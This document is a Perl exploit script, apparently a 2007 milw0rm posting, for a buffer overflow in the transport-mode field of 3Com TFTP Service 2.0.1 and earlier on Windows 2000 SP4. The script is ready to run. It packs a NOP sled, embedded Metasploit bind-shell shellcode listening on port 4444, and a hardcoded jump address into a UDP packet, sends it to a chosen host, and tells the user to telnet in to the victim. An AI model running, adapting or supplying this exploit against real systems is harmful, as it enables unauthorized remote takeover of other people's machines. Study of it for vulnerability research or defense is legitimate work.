#!/usr/bin/perl -w
#===============================================================
# 3Com TFTP Service <= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit
# By Umesh Wanve (umesh_345@yahoo.com)
#=============================================================== 
# Credits : Liu Qixu is credited with the discovery of this vulnerability.
# Reference : http://www.securityfocus.com/bid/21301
# Date : 27-02-2007
# Tested on Windows 2000 SP4 Server English
# Windows 2000 SP4 Professional English
# You can replace shellcode with your favourite one :
# Buffer overflow exists in transporting mode name of TFTP server.
# So here you go.
# Buffer = "\x00\x02" + "filename" + "\x00" + nop sled + Shellcode + JUMP + "\x00";
# This was written for educational purpose. Use it at your own risk. Author will be not be responsible for any damage.
#===============================================================
use IO::Socket;
if(!($ARGV[1]))
{
print "\n3COM Tftp long transport name exploit\n";
print "\tCoded by Umesh wanve\n\n";
print "Use: 3com_tftp.pl <host> <port>\n\n";
exit;
}
$target = IO::Socket::INET->new(Proto=>'udp',
PeerAddr=>$ARGV[0],
PeerPort=>$ARGV[1])
or die "Cannot connect to $ARGV[0] on port $ARGV[1]";
# win32_bind - EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com
my($shellcode)=
"\xba\xa0\x93\x0d\xe1\xdd\xc7\xd9\x74\x24\xf4\x5e\x2b\xc9" .
"\xb1\x56\x31\x56\x13\x83\xc6\x04\x03\x56\xaf\x71\xf8\x1d" .
"\x47\xfc\x03\xde\x97\x9f\x8a\x3b\xa6\x8d\xe9\x48\x9a\x01" .
"\x79\x1c\x16\xe9\x2f\xb5\xad\x9f\xe7\xba\x06\x15\xde\xf5" .
"\x97\x9b\xde\x5a\x5b\xbd\xa2\xa0\x8f\x1d\x9a\x6a\xc2\x5c" .
"\xdb\x97\x2c\x0c\xb4\xdc\x9e\xa1\xb1\xa1\x22\xc3\x15\xae" .
"\x1a\xbb\x10\x71\xee\x71\x1a\xa2\x5e\x0d\x54\x5a\xd5\x49" .
"\x45\x5b\x3a\x8a\xb9\x12\x37\x79\x49\xa5\x91\xb3\xb2\x97" .
"\xdd\x18\x8d\x17\xd0\x61\xc9\x90\x0a\x14\x21\xe3\xb7\x2f" .
"\xf2\x99\x63\xa5\xe7\x3a\xe0\x1d\xcc\xbb\x25\xfb\x87\xb0" .
"\x82\x8f\xc0\xd4\x15\x43\x7b\xe0\x9e\x62\xac\x60\xe4\x40" .
"\x68\x28\xbf\xe9\x29\x94\x6e\x15\x29\x70\xcf\xb3\x21\x93" .
"\x04\xc5\x6b\xfc\xe9\xf8\x93\xfc\x65\x8a\xe0\xce\x2a\x20" .
"\x6f\x63\xa3\xee\x68\x84\x9e\x57\xe6\x7b\x20\xa8\x2e\xb8" .
"\x74\xf8\x58\x69\xf4\x93\x98\x96\x21\x33\xc9\x38\x99\xf4" .
"\xb9\xf8\x49\x9d\xd3\xf6\xb6\xbd\xdb\xdc\xc1\xf9\x15\x04" .
"\x82\x6d\x54\xba\x35\x32\xd1\x5c\x5f\xda\xb7\xf7\xf7\x18" .
"\xec\xcf\x60\x62\xc6\x63\x39\xf4\x5e\x6a\xfd\xfb\x5e\xb8" .
"\xae\x50\xf6\x2b\x24\xbb\xc3\x4a\x3b\x96\x63\x04\x04\x71" .
"\xf9\x78\xc7\xe3\xfe\x50\xbf\x80\x6d\x3f\x3f\xce\x8d\xe8" .
"\x68\x87\x60\xe1\xfc\x35\xda\x5b\xe2\xc7\xba\xa4\xa6\x13" .
"\x7f\x2a\x27\xd1\x3b\x08\x37\x2f\xc3\x14\x63\xff\x92\xc2" .
"\xdd\xb9\x4c\xa5\xb7\x13\x22\x6f\x5f\xe5\x08\xb0\x19\xea" .
"\x44\x46\xc5\x5b\x31\x1f\xfa\x54\xd5\x97\x83\x88\x45\x57" .
"\x5e\x09\x75\x12\xc2\x38\x1e\xfb\x97\x78\x43\xfc\x42\xbe" .
"\x7a\x7f\x66\x3f\x79\x9f\x03\x3a\xc5\x27\xf8\x36\x56\xc2" .
"\xfe\xe5\x57\xc7";
print "++ Building Malicous Packet .....\n";
$nop="\x90" x 129; 
$jmp_2000 = "\x0e\x08\xe5\x77"; # jmp esi user32.dll windows 2000 sp4 english
$exploit = "\x00\x02"; #write request (header)
$exploit=$exploit."A"; #file name 
$exploit=$exploit."\x00"; #Start of transporting name
$exploit=$exploit.$nop;  #nop sled to land into shellcode 
$exploit=$exploit.$shellcode; #our Hell code 
$exploit=$exploit.$jmp_2000; #jump to shellcode 
$exploit=$exploit."\x00"; #end of TS mode name
print $target $exploit; #Attack on victim
print "++ Exploit packet sent ...\n";
print "++ Done.\n";
print "++ Telnet to 4444 on victim's machine ....\n";
sleep(2);
close($target);
exit;
#----------------------------------------------------------------------------------
# milw0rm.com [2007-02-28]

